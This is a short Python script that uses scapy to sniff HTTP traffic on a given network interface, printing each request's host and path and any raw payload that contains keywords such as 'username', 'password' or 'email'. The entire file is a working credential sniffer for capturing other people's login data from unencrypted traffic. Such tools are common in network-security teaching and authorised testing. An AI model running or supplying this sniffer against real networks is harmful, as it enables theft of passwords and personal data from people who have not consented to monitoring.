import scapy.all as scapy
import argparse
from scapy.layers import http
def get_interface():# to accept command line args
    parser= argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Specify interface on Which tosniff packet")
    arguments= parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface,store=False,prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+]Http request >>" +packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load=packet[scapy.Raw].load
            keys=["username","password","pass","email"]
            for key in keys:
                if key in load:
                    print("[+] possible password/username >>"+load)
                    break
                

iface=get_interface()

sniff(iface)

 
